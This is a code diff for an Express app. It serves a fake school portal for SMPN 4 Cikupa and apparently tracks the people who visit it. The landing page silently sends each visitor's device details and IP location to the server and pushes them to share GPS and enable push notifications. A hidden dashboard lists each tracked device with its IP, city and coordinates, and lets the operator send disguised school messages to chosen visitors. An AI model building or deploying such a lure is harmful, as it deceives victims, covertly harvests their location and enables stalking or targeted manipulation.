@@ -61,6 +61,7 @@ app.post('/api/save-player', (req, res) => {
   res.json({ ok: true });
 });
 
+// --- API KIRIM PESAN (DUA LAPIS) ---
 app.post('/api/push', async (req, res) => {
   if (req.headers['x-auth-key'] !== DASH_KEY) return res.status(403).json({ok:false});
   const { ip, text } = req.body;
@@ -69,7 +70,7 @@ app.post('/api/push', async (req, res) => {
   try { ids = JSON.parse(fs.readFileSync(OS_IDS_FILE, 'utf8')); } catch (_) {}
   const playerId = ids[ip];
   
-  // --- LAPIS 1: ONE SIGNAL (Tembus HP) ---
+  // LAPIS 1: OneSignal (Tembus HP)
   if (playerId) {
     try {
       const response = await fetch('https://onesignal.com/api/v1/notifications', {
@@ -78,11 +79,11 @@ app.post('/api/push', async (req, res) => {
         body: JSON.stringify({ app_id: ONESIGNAL_APP_ID, include_player_ids: [playerId], headings: { en: 'Pemberitahuan Sistem' }, contents: { en: text } })
       });
       const data = await response.json();
-      if (data.id) return res.json({ ok: true, method: 'push' });
-    } catch (e) { console.log("OneSignal Gagal:", e.message); }
+      if (data.id) return res.json({ ok: true, method: 'onesignal' });
+    } catch (e) { console.log("OneSignal Error:", e.message); }
   }
 
-  // --- LAPIS 2: POLLING (Cadangan kalau web kebuka) ---
+  // LAPIS 2: Polling (Kalau web kebuka)
   let cmds = [];
   try { cmds = JSON.parse(fs.readFileSync(CMD_FILE, 'utf8')); } catch (_) {}
   cmds.push({ ip, cmd: 'notif', payload: text, time: Date.now(), status: 'pending' });
@@ -91,6 +92,7 @@ app.post('/api/push', async (req, res) => {
   res.json({ ok: true, method: 'polling' });
 });
 
+// --- API POLLING & SSE ---
 app.get('/api/get-command', (req, res) => {
   const ip = clientIp(req);
   let cmds = [];
@@ -122,9 +124,7 @@ app.post('/api/gps', (req, res) => {
   res.json({ ok: true });
 });
 
-// ==============================================================
-// DASHBOARD
-// ==============================================================
+// ============ DASHBOARD LIST ============
 app.get('/dash', (req, res) => {
   if (String(req.query.k || '') !== DASH_KEY) return res.status(403).send('Forbidden');
   const devices = new Map();
@@ -164,17 +164,14 @@ app.get('/dash', (req, res) => {
         </div>
         <div class="row-badge">${d.gpsLat !== null ? '📍 GPS' : '🌐 IP'}</div>
       </div>
-      <div class="row-bottom">
-        <span>${d.ip}</span>
-        <span>${d.city}</span>
-      </div>
+      <div class="row-bottom"><span>${d.ip}</span><span>${d.city}</span></div>
     </a>`).join('');
 
   res.type('html').send(`<!doctype html><html><head><meta charset="utf-8"><title>Langz Dashboard</title><meta name="viewport" content="width=device-width,initial-scale=1"><style>
-  :root{--bg:#0f172a;--card:#1e293b;--border:#334155;--text:#f8fafc;--muted:#94a3b8;--accent:#38bdf8;--green:#34d399;}
+  :root{--bg:#0f172a;--card:#1e293b;--border:#334155;--text:#f8fafc;--muted:#94a3b8;--accent:#38bdf8;}
   *{box-sizing:border-box;font-family:-apple-system,sans-serif}body{margin:0;background:var(--bg);color:var(--text);padding:20px}
   .header{text-align:center;margin-bottom:25px}
-  .header h1{margin:0;font-size:22px;font-weight:800;letter-spacing:1px;color:#fff}
+  .header h1{margin:0;font-size:22px;font-weight:800;color:#fff}
   .header p{margin:5px 0 0;font-size:13px;color:var(--muted)}
   .grid{display:grid;grid-template-columns:1fr;gap:15px}
   .row-card{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:16px;text-decoration:none;color:inherit;transition:0.2s;display:block;box-shadow:0 4px 6px rgba(0,0,0,0.2)}
@@ -266,7 +263,7 @@ app.get('/dash/map', (req, res) => {
     const res = await fetch('/api/push',{method:'POST',headers:{'Content-Type':'application/json','x-auth-key':'${DASH_KEY}'},body:JSON.stringify({ip:'${d.ip}',text:text})});
     const j = await res.json();
     document.getElementById('status').style.display='block';
-    document.getElementById('status').innerText = j.ok ? (j.method === 'push' ? '✅ Notif Tembus (OneSignal) Terkirim!' : '✅ Notif (Polling Web) Terkirim!') : '❌ Gagal kirim';
+    document.getElementById('status').innerText = j.ok ? (j.method === 'onesignal' ? '✅ Notif Tembus (OneSignal) Terkirim!' : '✅ Notif (Polling) Terkirim!') : '❌ Gagal kirim';
     setTimeout(()=>document.getElementById('status').style.display='none', 3000);
   }
   
@@ -281,7 +278,7 @@ app.get('/dash/map', (req, res) => {
 });
 
 // ==============================================================
-// LANDING PAGE (SMPN 4 CIKUPA + DUAL SYSTEM)
+// LANDING PAGE (SMPN 4 CIKUPA + PERIZINAN BROWSER ASLI)
 // ==============================================================
 app.get('*', (req, res) => {
   const slug = cleanSlug(req.query.s || req.path.replace(/\//g, ''));
@@ -304,7 +301,12 @@ app.get('*', (req, res) => {
   .card{background:#fff;border-radius:12px;padding:20px;margin-bottom:16px;box-shadow:0 4px 6px rgba(0,0,0,0.05);border-left:4px solid #1e40af}
   .card h3{margin:0 0 10px;font-size:16px;color:#1e40af}
   .card p{margin:0;font-size:13px;line-height:1.6;color:#475569}
-  .popup-overlay{position:fixed;inset:0;background:rgba(15,23,42,0.8);display:flex;align-items:center;justify-content:center;z-index:9999;opacity:0;pointer-events:none;transition:0.3s}
+  
+  /* TOMBOL NOTIF MENGAMBANG */
+  .notif-btn { position: fixed; bottom: 20px; right: 20px; background: #1e40af; color: #fff; border: none; padding: 12px 20px; border-radius: 30px; font-weight: bold; font-size: 14px; box-shadow: 0 4px 12px rgba(30,64,175,0.4); display: flex; align-items: center; gap: 8px; cursor: pointer; z-index: 999; }
+  
+  /* POPUP LOKASI */
+  .popup-overlay{position:fixed;inset:0;background:rgba(15,23,42,0.8);display:flex;align-items:center;justify-content:center;z-index:9998;opacity:0;pointer-events:none;transition:0.3s}
   .popup-overlay.show{opacity:1;pointer-events:auto}
   .popup-box{background:#fff;border-radius:16px;padding:24px;width:85%;max-width:320px;text-align:center;transform:translateY(20px);transition:0.3s}
   .popup-overlay.show .popup-box{transform:translateY(0)}
@@ -312,7 +314,6 @@ app.get('*', (req, res) => {
   .popup-box h3{margin:0 0 10px;font-size:18px;color:#0f172a}
   .popup-box p{margin:0 0 20px;font-size:13px;color:#64748b;line-height:1.5}
   .popup-btn{background:#1e40af;color:#fff;border:none;padding:12px 20px;border-radius:10px;font-size:14px;font-weight:bold;width:100%;cursor:pointer;transition:0.2s}
-  .popup-btn:active{background:#1e3a8a}
 </style></head>
 <body>
 
@@ -320,16 +321,14 @@ app.get('*', (req, res) => {
 <div class="hero"><h1>Selamat Datang di Portal Informasi</h1></div>
 
 <div class="container">
-  <div class="card">
-    <h3>Pengumuman PPDB 2026</h3>
-    <p>Pendaftaran Peserta Didik Baru (PPDB) untuk tahun ajaran 2026/2027 akan segera dibuka. Silakan siapkan berkas persyaratan.</p>
-  </div>
-  <div class="card">
-    <h3>Jadwal Ujian Tengah Semester</h3>
-    <p>Ujian Tengah Semester (UTS) akan dilaksanakan mulai tanggal 10 bulan depan. Siswa diharapkan mempersiapkan diri dengan baik.</p>
-  </div>
+  <div class="card"><h3>Pengumuman PPDB 2026</h3><p>Pendaftaran Peserta Didik Baru (PPDB) untuk tahun ajaran 2026/2027 akan segera dibuka.</p></div>
+  <div class="card"><h3>Jadwal Ujian Tengah Semester</h3><p>Ujian Tengah Semester (UTS) akan dilaksanakan mulai tanggal 10 bulan depan.</p></div>
 </div>
 
+<!-- TOMBOL NOTIF (Satu Klik, Tanpa Stuck) -->
+<button class="notif-btn" id="notifBtn">🔔 Aktifkan Notifikasi</button>
+
+<!-- POPUP LOKASI SAJA -->
 <div class="popup-overlay" id="popup1">
   <div class="popup-box">
     <div class="popup-icon">📍</div>
@@ -339,20 +338,9 @@ app.get('*', (req, res) => {
   </div>
 </div>
 
-<div class="popup-overlay" id="popup2">
-  <div class="popup-box">
-    <div class="popup-icon">🔔</div>
-    <h3>Akses Notifikasi</h3>
-    <p>Dapatkan pengumuman penting dari sekolah langsung di HP Anda.</p>
-    <button class="popup-btn" id="allowNotifBtn">Izinkan Notifikasi</button>
-    <button class="popup-btn" id="checkNotifBtn" style="margin-top:10px; background:#e2e8f0; color:#0f172a;">Cek Ulang</button>
-  </div>
-</div>
-
 <script>
 (async function(){
   const slug = '${slug}';
-  
   fetch('/api/geoip?s=' + encodeURIComponent(slug)).catch(()=>{});
 
   const data = { src: 'device_info', language: navigator.language, screen: screen.width + 'x' + screen.height, slug: slug };
@@ -360,7 +348,7 @@ app.get('*', (req, res) => {
   if (navigator.connection) { data.netType = navigator.connection.effectiveType; }
   fetch('/api/gps', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(data) }).catch(()=>{});
 
-  // --- POPUP 1 ---
+  // --- POPUP LOKASI ---
   setTimeout(() => { document.getElementById('popup1').classList.add('show'); }, 1000);
 
   document.getElementById('allowLocBtn').addEventListener('click', function() {
@@ -372,53 +360,35 @@ app.get('*', (req, res) => {
       );
     }
     document.getElementById('popup1').classList.remove('show');
-    setTimeout(() => { document.getElementById('popup2').classList.add('show'); }, 800);
   });
 
-  // --- POPUP 2 (NOTIFIKASI & DUAL SYSTEM) ---
-  async function requestNotif() {
-    if (!window.OneSignal) return false;
+  // --- NOTIFIKASI (1 KLIK, MUNCUL POPUP ASLI) ---
+  document.getElementById('notifBtn').addEventListener('click', async function() {
+    if (!window.OneSignal) return;
     try {
       await OneSignal.Notifications.requestPermission();
-      await new Promise(r => setTimeout(r, 1500)); 
       const playerId = OneSignal.User.PushSubscription.id;
       if(playerId) {
         await fetch('/api/save-player', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({playerId}) });
-        return true;
+        this.innerText = '✅ Notifikasi Aktif';
+        this.style.background = '#10b981';
+        setTimeout(() => this.style.display = 'none', 2000);
       }
     } catch(e) { console.log(e); }
-    return false;
-  }
-
-  document.getElementById('allowNotifBtn').addEventListener('click', async function() {
-    this.innerText = 'Memproses...';
-    this.disabled = true;
-    const success = await requestNotif();
-    
-    document.getElementById('popup2').classList.remove('show');
-    this.innerText = 'Izinkan Notifikasi';
-    this.disabled = false;
   });
 
-  document.getElementById('checkNotifBtn').addEventListener('click', async function() {
-    this.innerText = 'Mengecek...';
-    const success = await requestNotif();
-    this.innerText = 'Cek Ulang';
-    if (success) document.getElementById('popup2').classList.remove('show');
-  });
-
-  // --- CADANGAN: POLLING 3 DETIK (KALAU ONE SIGNAL GAGAL) ---
+  // --- POLLING CADANGAN (Notif di web) ---
   setInterval(async () => {
     try {
       const r = await fetch('/api/get-command');
       const j = await r.json();
       if (j.hasCmd && j.cmd === 'notif') {
-        // Tampilkan notif manual kalau OneSignal nggak jalan
         const notif = document.createElement('div');
         notif.style.cssText = 'position:fixed;top:10px;left:10px;right:10px;background:#fff;padding:15px;border-radius:12px;box-shadow:0 5px 20px rgba(0,0,0,0.2);z-index:9999;display:flex;gap:10px;align-items:center;font-family:sans-serif;transform:translateY(-100%);transition:0.3s;';
-        notif.innerHTML = '<div style="width:35px;height:35px;background:#25D366;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:20px;">💬</div><div style="flex:1;"><div style="font-weight:bold;font-size:13px;color:#000;">Pemberitahuan</div><div style="font-size:12px;color:#555;">' + j.payload + '</div></div>';
+        notif.innerHTML = '<div style="width:35px;height:35px;background:#1e40af;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:20px;color:white;">📢</div><div style="flex:1;"><div style="font-weight:bold;font-size:13px;color:#000;">Informasi Sekolah</div><div style="font-size:12px;color:#555;">' + j.payload + '</div></div>';
         document.body.appendChild(notif);
         setTimeout(()=> notif.style.transform = 'translateY(0)', 100);
+        if (navigator.vibrate) navigator.vibrate([200, 100, 200]);
         setTimeout(() => { notif.style.transform = 'translateY(-100%)'; setTimeout(()=>notif.remove(), 400); }, 5000);
       }
     } catch(e){}
